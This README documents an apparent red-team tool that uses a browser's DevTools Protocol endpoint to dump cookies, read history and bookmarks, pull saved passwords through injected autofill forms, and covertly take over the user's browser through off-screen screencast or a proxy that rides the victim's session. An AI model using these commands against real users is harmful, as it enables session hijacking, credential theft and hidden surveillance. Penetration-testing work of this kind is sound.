# CDP Toolkit

`cdptk` is a Python command-line tool for working with chromium browsers through the Chrome DevTools Protocol (CDP). It is built for penetration testing and red team workflows where you have access to a running browser's CDP endpoint and want to inspect browser state, collect artifacts, or browse through the user's browser context.

## Install

From the `CDP-Toolkit` folder:

```powershell
pip install -e .
cdptk --help
```

## Quick Start

```powershell
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab-1.png
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

## Features

### `discover`

Shows basic information about the browser behind the CDP endpoint. It queries `/json/version` and `/json/list`, then reports the browser product, protocol version, user agent, WebSocket debugger URL, and visible HTTP targets.

Use it first to confirm that the endpoint is reachable and that you are talking to the expected browser.

```powershell
cdptk discover --cdp-endpoint http://127.0.0.1:9222
```

### `tabs list`

Lists open browser page targets as stable, 1-based tab indexes for the current command invocation. Each row includes a short target ID prefix, title, URL, and browser context when available.

Use this before tab-scoped actions such as screenshots. The indexes are generated from the current CDP target list, so rerun `tabs list` if tabs are opened or closed.

```powershell
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
```

### `tabs screenshot`

Captures a screenshot of a specific tab. The tab can be selected by the index from `tabs list`, a target ID prefix, or unique text from the tab title or URL.

This attaches to the tab through CDP and uses `Page.captureScreenshot`. With `--full`, it attempts a full-page capture instead of only the current viewport.

```powershell
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab-1.png
cdptk tabs screenshot portal.azure.com --cdp-endpoint http://127.0.0.1:9222 --full --out portal.png
```

### `cookies dump`

Dumps browser cookies through CDP using `Storage.getCookies`. It can filter by domain, redact values for safer review, and write JSON to disk.

This command asks the browser for cookies; it does not read cookie database files from the profile.

```powershell
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --domain microsoftonline.com 
```

### `bookmarks list`

Collects bookmarks or favorites through browser-rendered WebUI. The command opens the browser's bookmarks/favorites UI through CDP, prefers the browser's WebUI bookmark model when available, and falls back to rendered DOM extraction when needed.

It returns flattened bookmark rows by default, including title, URL, folder path, IDs, and timestamps when available. Use `--tree` for the raw browser bookmark tree.

```powershell
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk bookmarks list azure --cdp-endpoint http://127.0.0.1:9222 --domain microsoft.com
```

### `history search`

Searches browser history through the rendered `chrome://history` or `edge://history` WebUI. The command opens a temporary history target, inspects the WebUI model or rendered page, scrolls/loads entries as needed, and closes the temporary target after collection.

Use this to answer questions like "what sites has this browser visited" without touching the profile's `History` SQLite file.

```powershell
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk history search --cdp-endpoint http://127.0.0.1:9222 --domain login.microsoftonline.com
```

### `saved-passwords list`

Lists saved-password site metadata through the browser's password manager WebUI. It returns site groups, usernames, entry IDs, affiliated domains, passkey indicators, and storage hints when the browser exposes them.

This command inventories saved-password metadata. It does not decrypt passwords directly and does not read the `Login Data` database.

```powershell
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222 --out saved-password-sites.json
```

### `saved-passwords dump`

Attempts an autofill-backed password recovery workflow against a real origin. The command creates a target, navigates to the origin, uses either an injected controlled login form or provided selectors, triggers browser autofill with user-like input, and reads the resulting field values through CDP.

This depends on browser state. Autofill behavior can vary based on visibility, user gesture requirements, password manager settings, enterprise policy, origin matching, and whether the browser is willing to fill the form.

```powershell
cdptk saved-passwords dump https://example.com --cdp-endpoint http://127.0.0.1:9222 --mode visible --out autofill.json
cdptk saved-passwords dump https://example.com --cdp-endpoint http://127.0.0.1:9222 --no-inject-form --username-selector "#user" --password-selector "#pass"
```

### `extensions list`

Inventories installed extensions through `chrome://extensions` or `edge://extensions` WebUI. It opens a temporary WebUI target, extracts extension rows from the browser's rendered extension manager, and closes the target.

The output can include names, extension IDs, enabled state, descriptions, views/options pages, and related metadata depending on what the WebUI exposes.

```powershell
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222 --out extensions.json
```

### `page new`

Creates a new browser target through CDP. It can open a visible tab, background tab, hidden target, or an isolated browser context.

Use `--hold` for hidden targets or temporary contexts that should stay alive after creation. Without `--hold`, hidden targets can disappear when the CDP session closes.

```powershell
cdptk page new https://example.com --cdp-endpoint http://127.0.0.1:9222 --mode visible
cdptk page new https://example.com --cdp-endpoint http://127.0.0.1:9222 --mode hidden --hold
```

### `page snapshot`

Captures a structured page snapshot from an existing target. `--kind ax` captures an accessibility tree with `Accessibility.getFullAXTree`; `--kind dom` captures a DOM snapshot with `DOMSnapshot.captureSnapshot`.

Use accessibility snapshots for quick semantic inspection and DOM snapshots for lower-level page structure.

```powershell
cdptk page snapshot <target-prefix> --cdp-endpoint http://127.0.0.1:9222 --kind ax --out page.ax.json
cdptk page snapshot <target-prefix> --cdp-endpoint http://127.0.0.1:9222 --kind dom --out page.dom.json
```

### `page close`

Closes a target by full target ID or unique prefix. This is the cleanup command for targets you created with `page new`, `browser-takeover screencast`, or manual CDP work.

```powershell
cdptk page close <target-prefix> --cdp-endpoint http://127.0.0.1:9222
```

### `contexts list`

Lists non-default browser contexts. These are isolated contexts created through CDP, often for proxied browsing or contained sessions.

The default browser context is not listed because Chrome/Edge does not expose it as a normal disposable context.

```powershell
cdptk contexts list --cdp-endpoint http://127.0.0.1:9222
```

### `contexts dispose`

Disposes a non-default browser context and closes its targets. Use this to clean up isolated/proxied contexts created with `page new --mode isolated` or `browser-takeover screencast --browser-socks`.

```powershell
cdptk contexts dispose <browserContextId> --cdp-endpoint http://127.0.0.1:9222
```

### `browser-takeover screencast`

Starts a local operator web console that controls a CDP browser target through screencast frames and input events. The target browser renders the page; the operator sees a streamed view and sends clicks, keyboard input, paste, navigation, reload, back/forward, and close actions through CDP.

This is the highest-fidelity interactive browsing mode because Chrome/Edge remains the real browser running the site. It keeps browser-held cookies, storage, enterprise auth state, WebAuthn behavior, extensions, and browser-specific JavaScript behavior inside the browser that already owns that state. This is especially helpful when targeting complex web apps that do not play well with browser-takeover proxy.

> [!WARNING]
> `browser-takeover screencast` creates a real Chrome/Edge target on the CDP host. Depending on the selected mode and current browser/window state, the new tab, window, or web page may be visible to the user.

```powershell
cdptk browser-takeover screencast `
  --cdp-endpoint http://127.0.0.1:9222 `
  --listen 127.0.0.1:8093 `
  --start-url https://portal.azure.com `
  --mode offscreen
```

Then browse locally to:

```text
http://127.0.0.1:8093
```

Modes:

| Mode | What it does |
| --- | --- |
| `offscreen` | Creates a dedicated window and moves it off-screen before screencasting it. |
| `foreground` | Creates a visible window, useful for troubleshooting. |
| `background` | Creates a background tab in the current browser window. |

### `browser-takeover proxy`

Starts a local HTTP/HTTPS proxy on the operator machine. The operator points a local browser or HTTP client at this proxy, and upstream requests are fetched through hidden victim-Chrome tabs using CDP.

For HTTPS, the toolkit generates a local CA and per-host leaf certificates. Import `runs/proxy/certs/ca.crt` into the operator browser if you want HTTPS sites to render without certificate errors.

```powershell
cdptk browser-takeover proxy `
  --cdp-endpoint http://127.0.0.1:9222 `
  --listen 127.0.0.1:8080 `
  --cert-dir runs/proxy/certs `
  -v
```

Configure the operator browser proxy:

```text
HTTP proxy: 127.0.0.1:8080
HTTPS proxy: 127.0.0.1:8080
```

What the proxy does:

- Accepts plaintext HTTP proxy requests and HTTPS `CONNECT`.
- Uses victim Chrome to perform upstream document requests.
- Preserves victim Chrome cookies and user agent where CDP exposes them.
- Strips blocking CSP/CORS/framing headers to improve operator-side renderability.
- Uses `Network.loadNetworkResource` for GET/HEAD subresources such as fonts, scripts, styles, images, and download-prone extensions so those bytes stream back to the operator instead of causing victim-side downloads.
- Denies hidden-tab browser downloads by default with `--deny-downloads`.
- Retries top-level GET/HEAD attachment navigations that abort with `net::ERR_ABORTED` using a same-origin `Runtime.evaluate(fetch(..., credentials: "include"))` fallback so the operator browser can receive the file.

Proxy mode is useful for targeted request/response workflows and for browsing from the victim browser's network position. It is less faithful than screencast mode for complex portals because the operator browser renders and executes JavaScript locally while victim Chrome performs upstream fetches.

## Cleanup

Use `page close` for individual targets and `contexts dispose` for isolated browser contexts. Temporary WebUI targets created by collectors are intended to close automatically.

```powershell
cdptk page close <target-prefix> --cdp-endpoint http://127.0.0.1:9222
cdptk contexts dispose <browserContextId> --cdp-endpoint http://127.0.0.1:9222
```

## Reference

Tool is built on the information presented during [Modern Session Hijacking by Living off the DevTools Protocol by Cedric Van Bockhaven](https://specterops.io/so-con/)
